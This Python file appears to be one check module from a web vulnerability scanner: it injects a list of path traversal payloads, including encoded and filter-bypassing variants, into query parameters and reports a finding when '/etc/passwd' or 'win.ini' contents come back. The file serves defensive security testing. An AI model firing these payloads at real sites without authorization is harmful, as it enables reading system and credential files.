import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


PT_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc/passwd",
    "%252e%252e%252fetc/passwd",
    "..%252f..%252fetc/passwd",
    "..%2f..%2fetc/passwd",
    "..\\..\\..\\etc/passwd",
    "....//....//....//etc/passwd",
    "..;/..;/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
]


class PathTraversalVariantsCheck(BaseCheck):
    name = "active_path_traversal_variants"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                for payload in PT_PAYLOADS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        if "root:x" in resp.text or "root:x" in resp.text or "[extensions]" in resp.text:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="Path traversal variant detected",
                                description=f"Parameter '{param}' may be vulnerable to path traversal.",
                                evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                remediation="Validate file paths against an allowlist. Normalize paths before validation.",
                                cwe="CWE-22",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
